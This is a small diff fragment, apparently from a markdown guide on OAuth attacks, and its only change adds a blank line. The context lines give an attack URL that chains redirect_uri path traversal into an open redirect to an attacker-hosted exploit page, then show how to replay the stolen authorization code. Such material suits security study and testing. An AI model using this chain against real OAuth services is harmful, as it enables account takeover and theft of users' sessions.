@@ -95,6 +95,7 @@ If it's authorization code flow....
 	https://oauth.server.com/auth?client_id=[id]&redirect_uri=https://valid.server.com/oauth-callback/../open/redirect?path=https://wearelucid.io/exploit.html&response_type=token&nonce=[nonce]&scope=openid%20profile%20email.
 	```
 	You should see the code come through in your exploit server log. 
+
 2) As the attacker in a separate browser or tab, send the code you stole to the OAuth provider: 
 	```
 	https://oauth.server.com/oauth-callback?code=(stolen_code)
